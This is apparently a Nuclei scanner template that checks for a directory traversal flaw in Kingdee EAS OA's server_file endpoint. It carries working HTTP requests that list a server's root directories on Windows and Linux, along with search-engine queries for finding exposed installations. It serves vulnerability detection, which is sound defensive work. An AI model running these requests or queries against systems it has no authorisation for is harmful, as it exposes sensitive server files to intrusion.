id: kingdee-eas-directory-traversal

info:
  name: 金蝶 EAS server_file/file - traversal
  author: ritikchaddha
  severity: high
  description: Kingdee EAS OA server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.
  reference:
    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    verified: true
    max-request: 2
    fofa-query: body="easSessionId" || header="easportal" || header="eassso/login" || banner="eassso/login" || body="/eassso/common" || (title="EAS系统登录" && body="金蝶")
    hunter-query: web.body="/eassso/images/"
    quake-query: app:"金蝶-EAS"
    zoomeye-query: app:"金蝶 EAS"
  tags: kingdee,traversal,eas

http:
  - raw:
      - |
        GET /appmonitor/protected/selector/server_file/files?folder=C://&suffix= HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /appmonitor/protected/selector/server_file/files?folder=/&suffix= HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"name":"Windows","path":"C:\\\\Windows","folder":true}'
          - '{"name":"root","path":"/root","folder":true}'
        condition: or

      - type: word
        words:
          - "application/json"
        part: header

      - type: status
        status:
          - 200

